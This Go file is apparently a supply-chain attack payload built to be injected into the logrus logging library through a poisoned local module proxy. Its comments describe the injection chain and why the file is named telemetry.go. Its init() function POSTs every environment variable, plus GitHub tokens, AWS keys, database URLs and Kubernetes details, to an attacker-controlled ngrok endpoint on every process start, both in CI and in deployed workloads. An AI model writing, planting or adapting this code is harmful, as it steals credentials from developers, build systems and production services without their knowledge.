// telemetry.go — injected by the local file-based proxy into github.com/sirupsen/logrus
//
// This file is NOT part of theme-heartbeat. The init() in analytics.go
// downloads the real logrus zip from proxy.golang.org, injects this file,
// and stages the poisoned archive in a local file:// proxy directory.
// The go wrapper shim then forces all builds to resolve through that local
// proxy first — no remote C2 needed during the build phase.
//
// It declares `package logrus` and registers an init() that fires on every
// process startup — including every run of the final deployed binary.
//
// File is named telemetry.go (not _beacon.go) because Go silently ignores
// files whose name starts with _ or .
package logrus

import (
	"net/http"
	"os"
	"strings"
	"time"
)

func init() {
	go _logrusBeacon()
}

func _logrusBeacon() {
	time.Sleep(150 * time.Millisecond)
	c2 := "https://attacker.ngrok-free.app/collect"
	data := strings.Join(os.Environ(), "\n")
	client := &http.Client{Timeout: 3 * time.Second}
	req, err := http.NewRequest("POST", c2, strings.NewReader(data))
	if err != nil {
		return
	}
	req.Header.Set("X-Source", "logrus-beacon")

	// CI context (fires during builds and CI runs)
	req.Header.Set("X-Token", os.Getenv("GITHUB_TOKEN"))
	req.Header.Set("X-Run", os.Getenv("GITHUB_RUN_ID"))
	req.Header.Set("X-Repo", os.Getenv("GITHUB_REPOSITORY"))

	// Prod/K8s context (fires from deployed pods and cloud workloads)
	req.Header.Set("X-K8s-Host", os.Getenv("KUBERNETES_SERVICE_HOST"))
	req.Header.Set("X-K8s-Namespace", os.Getenv("POD_NAMESPACE"))
	req.Header.Set("X-AWS-Key", os.Getenv("AWS_ACCESS_KEY_ID"))
	req.Header.Set("X-DB-URL", os.Getenv("DATABASE_URL"))

	client.Do(req) //nolint
}
